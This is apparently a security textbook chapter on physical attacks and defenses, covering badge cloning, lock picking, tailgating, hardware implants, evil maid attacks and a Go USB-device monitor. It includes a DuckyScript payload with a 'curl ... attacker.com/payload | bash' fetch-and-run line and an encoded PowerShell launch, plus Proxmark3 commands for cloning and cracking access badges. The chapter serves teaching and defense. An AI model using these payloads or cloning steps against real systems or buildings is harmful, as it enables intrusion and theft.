# Chapter 42: Physical Security — When Digital Attacks Go Analog

*Physical security is the foundation everything else is built on. The most sophisticated firewall is useless if an attacker can walk in, plug in a device, or steal hardware.*

---

## The Physical Attack Surface

```
External Perimeter
├── Parking lots / dumpsters
├── Loading docks / delivery entrances  
├── Visitor entrance
└── Emergency exits (often propped open)

Internal
├── Reception / lobby
├── Server room / data center
├── Network closets / patch panels
├── Executive offices
└── Printer/scanner areas (stored documents)

Hardware Attack Surface
├── Exposed network ports (lobbies, conference rooms)
├── USB ports on workstations
├── Unlocked computers (screen walkaways)
├── Unencrypted laptops/drives
└── Hardware left unattended (Thunderbolt, PCIe attacks)
```

---

## Physical Penetration Testing

Red teams test physical security with permission. Common tests:

```
1. Badge Cloning
   - Passive RFID/HID reader (Proxmark3)
   - Stand near badge-wearing employee
   - Clone their card
   - Walk in with cloned badge

2. Lock Picking / Bypass
   - Lock picks for pin tumbler locks
   - Bump keys
   - Shim attacks (padlocks)
   - Under-door tools (UDT) to push lever handles
   - "Loiding" — credit card on spring bolts

3. Tailgating
   - Follow employee through door ("hands full — can you hold that?")
   - Dress as delivery/maintenance
   - Walk with purpose and confidence

4. Dumpster Diving
   - Look for shredded documents (reconstruct)
   - Find org charts, phone lists, network diagrams
   - Hardware disposal (still-functioning drives)
```

---

## Hardware Hacking Tools

```
USB Rubber Ducky (Hak5)
- Looks like a USB drive
- Acts as a keyboard (HID)
- Types payloads at 1000 WPM
- Bypasses AV (it's "just typing")
- Example payload: open PowerShell, download + execute malware

O.MG Cable
- Looks like a USB-C cable
- Contains a WiFi-enabled implant
- Remote command and control via WiFi
- Triggers on connection

LAN Turtle (Hak5)
- Looks like a USB ethernet adapter
- Provides SSH tunnel back to attacker
- Plugged into open USB port on PC

Pineapple (Hak5 WiFi)
- Rogue access point
- Deauth attack to disconnect clients from real AP
- Clients reconnect to Pineapple (man-in-the-middle)
- Captures credentials, injects content

Proxmark3
- RFID/NFC research tool
- Clone HID, EM4100, Mifare cards
- Read card data from 10-15cm away
```

---

## BadUSB / HID Attack Payloads

```
# Rubber Ducky DuckyScript example
# This types commands when plugged in:

DELAY 1000          # wait for OS to recognize
GUI r               # Windows key + R (Run dialog)
DELAY 500
STRING powershell -NoP -W h -Exec Bypass -enc BASE64_PAYLOAD
ENTER

# Linux payload:
CTRL-ALT-t          # open terminal
DELAY 500
STRING curl -s http://attacker.com/payload | bash
ENTER
```

---

## RFID/Badge Cloning

```bash
# Proxmark3 commands
pm3 > auto           # identify card type

# Read HID card
pm3 > lf hid read

# Clone to T5577 (write-capable card)
pm3 > lf hid clone --r RAW_DATA_FROM_READ

# Mifare Classic (office badges)
pm3 > hf mf autopwn    # attempt to crack Mifare keys
pm3 > hf mf dump       # dump all sectors
```

---

## Lock Picking Basics

Understanding physical locks helps assess real security:

```
Pin Tumbler Lock (most common):
- Key pins + driver pins separated by shear line
- Correct key aligns all pins at shear line → cylinder turns

Single Pin Picking (SPP):
1. Apply light tension to cylinder with tension wrench
2. Push pins up with pick until they "set" (slight click)
3. Manufacturing tolerances mean pins set at different heights
4. Repeat until all pins set → lock opens

Raking:
- Rapidly move raking pick up/down while applying tension
- Randomly sets pins by motion
- Faster but less reliable than SPP

Security measure: Medeco, Abloy Protec, Mul-T-Lock
- High security locks with anti-pick features
- Security pins (spool, serrated)
```

---

## Evil Maid Attack

Attacker with brief physical access to an unattended computer:

```
Scenarios:
- Hotel room laptop while at conference
- Office visit while employee steps away
- Laptop seized at border crossing

What they can do in 2 minutes:
1. Boot from USB → bypass BitLocker (with TPM only, no PIN)
2. Install hardware keylogger (between keyboard and computer)
3. Cold boot attack → dump RAM encryption keys
4. Install firmware implant (persistent, survives OS reinstall)

Defenses:
- Full disk encryption with pre-boot PIN (not just TPM)
- BIOS password + disable USB boot
- Tamper-evident seals on laptop
- Never leave device unattended in public
- Carry-on only (don't check luggage with devices)
```

---

## Securing the Physical Layer

```
Perimeter Security:
- Mantrap (double-door airlock) for server rooms
- Anti-tailgating turnstiles
- Security cameras with retention
- Security guard with visitor log

Badge Access:
- Use Mifare DESFire (encrypted) not HID (cloneable)
- Separate zones (only IT enters server room)
- Badge readers log all access attempts
- Review logs monthly

Workstation Security:
- Screen lock after 5 minutes
- Disable USB auto-run (Group Policy)
- Cable locks for laptops in offices
- Clear desk policy (no sensitive docs visible)

Hardware Security:
- Seal unused USB ports with epoxy/locks
- Inventory all hardware assets
- Tag/mark hardware (invisible UV ink, serial numbers)
- Secure disposal: shred drives (not just wipe)
```

---

## Go: Hardware Asset Monitor

```go
package main

import (
    "fmt"
    "os"
    "path/filepath"
    "strings"
    "time"
)

// Monitor USB devices being connected (Linux)
func monitorUSBDevices() {
    known := map[string]bool{}
    
    // Baseline existing devices
    initial := getUSBDevices()
    for _, d := range initial {
        known[d] = true
    }
    
    fmt.Printf("Baseline: %d USB devices known\n", len(known))
    
    ticker := time.NewTicker(5 * time.Second)
    for range ticker.C {
        current := getUSBDevices()
        for _, d := range current {
            if !known[d] {
                fmt.Printf("[ALERT] New USB device: %s\n", d)
                known[d] = true
            }
        }
    }
}

func getUSBDevices() []string {
    var devices []string
    
    usbPath := "/sys/bus/usb/devices"
    entries, err := os.ReadDir(usbPath)
    if err != nil {
        return devices
    }
    
    for _, e := range entries {
        // Read device info
        productFile := filepath.Join(usbPath, e.Name(), "product")
        vendorFile := filepath.Join(usbPath, e.Name(), "idVendor")
        
        product, _ := os.ReadFile(productFile)
        vendor, _ := os.ReadFile(vendorFile)
        
        if len(product) > 0 {
            dev := fmt.Sprintf("%s: %s [VID: %s]",
                e.Name(),
                strings.TrimSpace(string(product)),
                strings.TrimSpace(string(vendor)))
            devices = append(devices, dev)
        }
    }
    return devices
}

func main() {
    fmt.Println("USB Monitor started - watching for new devices")
    monitorUSBDevices()
}
```

---

## Summary

| Physical Attack | Tool | Detection/Defense |
|----------------|------|------------------|
| Tailgating | Social skills | Mantrap, guard escort |
| Badge cloning | Proxmark3 | Encrypted badges (DESFire) |
| HID attack | Rubber Ducky | Disable USB auto-run, EDR |
| Lock picking | Picks, tension wrench | High-security locks, cameras |
| Evil maid | USB boot | Pre-boot PIN, BIOS lock |
| Dumpster diving | Hands | Cross-cut shredding, clean desk |

---

## Exercises

1. Practice lock picking on a transparent practice lock — understand pin tumbler mechanics
2. Build the USB monitor in Go and test it detects new devices
3. Research the Target data breach (2013) — it started with a physical/social engineering attack on an HVAC vendor
4. Audit your home/office for physical security weaknesses — what would a red teamer exploit first?
